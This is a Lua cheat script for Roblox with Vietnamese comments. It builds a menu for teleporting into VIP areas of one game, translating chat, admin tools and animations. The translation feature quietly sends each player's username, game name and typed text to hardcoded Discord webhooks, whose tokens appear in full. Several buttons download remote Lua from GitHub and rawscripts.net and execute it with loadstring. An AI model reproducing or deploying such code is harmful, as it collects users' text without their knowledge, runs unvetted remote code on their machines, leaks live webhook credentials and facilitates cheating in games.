-- =================================================================
-- SCRIPT CHÍNH TỔNG HỢP (tp.lua) - KHÔNG GHI ĐÈ VỊ TRÍ KHI TP LIÊN TỤC
-- =================================================================
print("⏳ Đang khởi chạy tp.lua...")

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HttpService = game:GetService("HttpService")
local MarketService = game:GetService("MarketplaceService")
local GroupService = game:GetService("GroupService")
local localPlayer = Players.LocalPlayer
local playerGui = localPlayer:WaitForChild("PlayerGui")

-- 0. Nhắc tham gia Group
local GROUP_ID = 175907291
task.spawn(function()
    task.wait(2)
    if not localPlayer:IsInGroup(GROUP_ID) then
        pcall(function() GroupService:PromptJoinAsync(GROUP_ID) end)
    end
end)

-- 1. Webhook cấu hình
local rawWebhookBot = "https://discord.com/api/webhooks/1556970046679547924/GYvAH0yk3kFrs1YiO8w485O4Sv3w9ZHDFQ7WYBVoFlCS1Ih9AVGNBICeFxhob1prIbAn"
local WEBHOOK_BOT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookBot

local rawWebhookChat = "https://discord.com/api/webhooks/1556960491086155776/qv4XW06rSiS1cvwTYszxAYyBJwrmJ9gBlp-9R4CTgxlxkEYvSLguUG9tQXqxg15tTefP"
local WEBHOOK_CHAT_URL = "https://cf-discord-proxy.numelon-web-services.workers.dev/?url=" .. rawWebhookChat

local successName, gameInfo = pcall(function()
    return MarketService:GetProductInfo(game.PlaceId)
end)
local gameName = (successName and gameInfo and gameInfo.Name) or "Unknown Game"
local isTargetGame = (game.PlaceId == 10033751448)

local function sendBotLog(actionName, details)
    task.spawn(function()
        pcall(function()
            local GameStore = _G.GameStore
            if not GameStore then
                local keywordUrl = "https://raw.githubusercontent.com/ductrungvo344-pixel/Hack/refs/heads/main/game_keyword.lua"
                local success, res = pcall(function()
                    return loadstring(game:HttpGet(keywordUrl))()
                end)
                if success then GameStore = res end
            end
            if GameStore and GameStore.SaveData then
                GameStore.SaveData(gameName, details, game.PlaceId)
            end
        end)
    end)
end

local function sendChatLog(vietnameseText, englishText)
    task.spawn(function()
        pcall(function()
            local payload = {
                ["content"] = string.format("🌐 **[Log Dịch Chat]**\n👤 **Player:** `%s`\n🗺️ **Game:** `%s`\n🇻🇳 **Tiếng Việt:** `%s`\n🇬🇧 **Tiếng Anh:** `%s`", 
                    localPlayer.Name, gameName, vietnameseText, englishText)
            }
            local reqFunc = request or http_request or (syn and syn.request)
            if reqFunc then
                reqFunc({
                    Url = WEBHOOK_CHAT_URL,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end)
    end)
end

-- =================================================================
-- KHỞI TẠO GIAO DIỆN (GUI)
-- =================================================================
if playerGui:FindFirstChild("TeleportGUI") then
    playerGui.TeleportGUI:Destroy()
end

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "TeleportGUI"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 240, 0, 420)
frame.Position = UDim2.new(0.05, 0, 0.18, 0)
frame.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 8)
uiCorner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(0.7, 0, 0, 25)
title.Position = UDim2.new(0.05, 0, 0, 5)
title.BackgroundTransparency = 1
title.Text = "⚡ MENU TELEPORT & TIỆN ÍCH"
title.TextColor3 = Color3.fromRGB(255, 215, 0)
title.TextSize = 11
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = frame

local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 22, 0, 22)
minBtn.Position = UDim2.new(0.85, 0, 0, 6)
minBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
minBtn.TextSize = 14
minBtn.Font = Enum.Font.GothamBold
minBtn.Parent = frame

local minCorner = Instance.new("UICorner")
minCorner.CornerRadius = UDim.new(0, 4)
minCorner.Parent = minBtn

local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(0.95, 0, 0, 375)
scroll.Position = UDim2.new(0.025, 0, 0, 35)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.ScrollBarThickness = 6
scroll.Parent = frame

local function createButton(name, text, positionY, color)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0.95, 0, 0, 26)
    btn.Position = UDim2.new(0.02, 0, 0, positionY)
    btn.BackgroundColor3 = color
    btn.Text = text
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextSize = 11
    btn.Font = Enum.Font.GothamBold
    btn.Parent = scroll

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 4)
    corner.Parent = btn
    return btn
end

local function createSubLabel(text, positionY)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(0.95, 0, 0, 18)
    lbl.Position = UDim2.new(0.02, 0, 0, positionY)
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
    lbl.TextSize = 10
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

local currentY = 2

-- 1. TELEPORT SECTION (KHÔNG LƯU ĐÈ VỊ TRÍ KHI TP QUA LẠI)
createSubLabel("⚡ HỆ THỐNG TELEPORT", currentY)
currentY = currentY + 20

local oldPosition = nil
local isTeleported = false -- Cờ kiểm tra xem đang ở trạng thái đã TP hay chưa

local function executeTeleport(targetCFrame)
    local character = localPlayer.Character
    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
    if rootPart then
        -- Nếu chưa TP lần nào, lưu lại vị trí gốc hiện tại
        if not isTeleported then
            oldPosition = rootPart.CFrame
            isTeleported = true
        end
        
        rootPart.Anchored = true
        rootPart.CFrame = targetCFrame
        task.wait(0.3)
        rootPart.Anchored = false
    end
end

if isTargetGame then
    createSubLabel("🔥 SUPER MEGA VIP", currentY)
    local smv1 = createButton("SMV1", "1. (-95, 17633, 9039)", currentY + 20, Color3.fromRGB(0, 150, 230))
    local smv2 = createButton("SMV2", "2. (-124, 17633, 9043)", currentY + 48, Color3.fromRGB(0, 150, 230))
    local smv3 = createButton("SMV3", "3. (-82, 17633, 9044)", currentY + 76, Color3.fromRGB(0, 150, 230))
    currentY = currentY + 108

    createSubLabel("💎 VIP", currentY)
    local vip1 = createButton("VIP1", "1. (-94, 17633, 9357)", currentY + 20, Color3.fromRGB(0, 180, 90))
    currentY = currentY + 52

    createSubLabel("⭐ MEGA VIP", currentY)
    local mv1 = createButton("MV1", "1. (-88, 17633, 9224)", currentY + 20, Color3.fromRGB(150, 0, 230))
    local mv2 = createButton("MV2", "2. (-112, 17633, 9224)", currentY + 48, Color3.fromRGB(150, 0, 230))
    currentY = currentY + 80

    smv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-95, 17633, 9039)) end)
    smv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-124, 17633, 9043)) end)
    smv3.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-82, 17633, 9044)) end)
    vip1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-94, 17633, 9357)) end)
    mv1.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-88, 17633, 9224)) end)
    mv2.MouseButton1Click:Connect(function() executeTeleport(CFrame.new(-112, 17633, 9224)) end)
end

local backBtn = createButton("Back", "🔄 Quay lại vị trí cũ", currentY, Color3.fromRGB(230, 70, 70))
currentY = currentY + 32

backBtn.MouseButton1Click:Connect(function()
    if oldPosition then
        local character = localPlayer.Character
        local rootPart = character and character:FindFirstChild("HumanoidRootPart")
        if rootPart then
            rootPart.Anchored = true
            rootPart.CFrame = oldPosition
            task.wait(0.2)
            rootPart.Anchored = false
            -- Reset lại trạng thái để lần TP sau tiếp tục lưu đúng điểm xuất phát mới
            oldPosition = nil
            isTeleported = false
        end
    end
end)

-- 2. BOT TRIGGER
createSubLabel("🤖 SCRIPTBLOX BOT TRIGGER", currentY)
local botSendBtn = createButton("BotSendBtn", "📤 Gửi Game Info Lên Bot", currentY + 20, Color3.fromRGB(150, 0, 200))
currentY = currentY + 52

botSendBtn.MouseButton1Click:Connect(function()
    botSendBtn.Text = "⏳ Đang gửi..."
    sendBotLog("Request ScriptBlox & Rscripts", "Yêu cầu quét script cho: " .. gameName)
    task.wait(1.5)
    botSendBtn.Text = "📤 Gửi Game Info Lên Bot"
end)

-- 3. DỊCH CHAT
createSubLabel("🌐 DỊCH CHAT (MYMEMORY API)", currentY)
local chatBox = Instance.new("TextBox")
chatBox.Size = UDim2.new(0.95, 0, 0, 26)
chatBox.Position = UDim2.new(0.02, 0, 0, currentY + 20)
chatBox.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
chatBox.PlaceholderText = "Nhập tiếng Việt cần dịch..."
chatBox.Text = ""
chatBox.TextColor3 = Color3.fromRGB(255, 255, 255)
chatBox.TextSize = 11
chatBox.Font = Enum.Font.Gotham
chatBox.ClearTextOnFocus = false
chatBox.Parent = scroll

local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 4)
boxCorner.Parent = chatBox

local translateBtn = createButton("TransBtn", "🔍 Dịch sang English", currentY + 50, Color3.fromRGB(0, 120, 255))
local resultBox = Instance.new("TextBox")
resultBox.Size = UDim2.new(0.95, 0, 0, 26)
resultBox.Position = UDim2.new(0.02, 0, 0, currentY + 78)
resultBox.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
resultBox.PlaceholderText = "Bản dịch tiếng Anh..."
resultBox.Text = ""
resultBox.TextColor3 = Color3.fromRGB(0, 255, 150)
resultBox.TextSize = 11
resultBox.Font = Enum.Font.GothamBold
resultBox.ClearTextOnFocus = false
resultBox.Parent = scroll

local resCorner = Instance.new("UICorner")
resCorner.CornerRadius = UDim.new(0, 4)
resCorner.Parent = resultBox

local copyBtn = createButton("CopyBtn", "📋 Copy Bản Dịch", currentY + 108, Color3.fromRGB(0, 180, 90))
currentY = currentY + 140

translateBtn.MouseButton1Click:Connect(function()
    local input = chatBox.Text
    if input == "" or input == " " then return end
    translateBtn.Text = "⏳ Đang dịch..."
    task.spawn(function()
        local success, result = pcall(function()
            local cleanInput = HttpService:UrlEncode(input)
            local url = "https://api.mymemory.translated.net/get?q=" .. cleanInput .. "&langpair=vi|en"
            local reqFunc = request or http_request or (syn and syn.request)
            if not reqFunc then return nil end
            local res = reqFunc({ Url = url, Method = "GET" })
            if res and (res.StatusCode == 200 or res.StatusDescription == "OK") then
                local data = HttpService:JSONDecode(res.Body)
                return data and data.responseData and data.responseData.translatedText
            end
            return nil
        end)
        
        if success and result and result ~= "" then
            resultBox.Text = result
            sendChatLog(input, result)
        else
            resultBox.Text = "⚠️ Lỗi dịch thuật!"
        end
        translateBtn.Text = "🔍 Dịch sang English"
    end)
end)

copyBtn.MouseButton1Click:Connect(function()
    if resultBox.Text ~= "" and resultBox.Text ~= "⚠️ Lỗi dịch thuật!" then
        pcall(function() setclipboard(resultBox.Text) end)
        copyBtn.Text = "✅ Đã Copy!"
        task.wait(1.5)
        copyBtn.Text = "📋 Copy Bản Dịch"
    end
end)

-- 4. ADMIN SCRIPT
createSubLabel("🛠️ SCRIPT KHÁC", currentY)
local adminBtn = createButton("Admin", "👑 Nameless Admin", currentY + 20, Color3.fromRGB(255, 140, 0))
currentY = currentY + 52

adminBtn.MouseButton1Click:Connect(function()
    pcall(function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Nameless-Admin-23304"))() end)
end)

-- 5. KURDISH ANIMATIONS SECTION
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local isR15 = (humanoid.RigType == Enum.HumanoidRigType.R15)

createSubLabel(isR15 and "💃 ANIMATIONS (R15)" or "💃 ANIMATIONS (R6)", currentY)
currentY = currentY + 20

local animList = {}
if not isR15 then
    animList = {
        {"Head Throw", "35154961", true, 1}, {"Floating Head", "121572214", false, 1},
        {"Crouch", "182724289", false, 1}, {"Floor Crawl", "282574440", false, 1},
        {"Dino Walk", "204328711", false, 1}, {"Jumping Jacks", "429681631", false, 1},
        {"Hero Jump", "184574340", true, 1}, {"Faint", "181526230", false, 1},
        {"Dab", "183412246", true, 1}, {"Spinner", "188632011", true, 2},
        {"Spin Dance", "429730430", true, 1}, {"Moon Dance", "45834924", true, 1}
    }
else
    animList = {
        {"Crazy Slash", "674871189", true, 1}, {"Open", "582855105", true, 1},
        {"R15 Spinner", "754658275", true, 1}, {"Arms Out", "582384156", true, 1},
        {"Float Slash", "717879555", true, 1}, {"Fling Arms", "754656200", true, 10}
    }
end

local normalColor = isR15 and Color3.fromRGB(110, 115, 140) or Color3.fromRGB(180, 140, 60)
local activeColor = isR15 and Color3.fromRGB(140, 160, 220) or Color3.fromRGB(230, 180, 70)

for _, animData in ipairs(animList) do
    local animName, animId, isLoop, speed = animData[1], animData[2], animData[3], animData[4]
    local animObj = Instance.new("Animation")
    animObj.AnimationId = "rbxassetid://" .. animId
    local track = humanoid:LoadAnimation(animObj)
    
    local btn = createButton("Anim_" .. animName, animName, currentY, normalColor)
    currentY = currentY + 28
    
    local isPlaying = false
    btn.MouseButton1Click:Connect(function()
        isPlaying = not isPlaying
        if isPlaying then
            btn.BackgroundColor3 = activeColor
            if isLoop then
                task.spawn(function()
                    while isPlaying do
                        if not track.IsPlaying then track:Play(0.1, 1, speed) end
                        task.wait()
                    end
                end)
            else
                track:Play(0.1, 1, speed)
            end
        else
            track:Stop()
            btn.BackgroundColor3 = normalColor
        end
    end)
end

scroll.CanvasSize = UDim2.new(0, 0, 0, currentY + 30)

minBtn.MouseButton1Click:Connect(function()
    local isOpen = scroll.Visible
    scroll.Visible = not isOpen
    frame.Size = isOpen and UDim2.new(0, 240, 0, 35) or UDim2.new(0, 240, 0, 420)
    minBtn.Text = isOpen and "+" or "-"
end)

print("🎉 Khởi chạy thành công tp.lua bản chuẩn không ghi đè vị trí!")
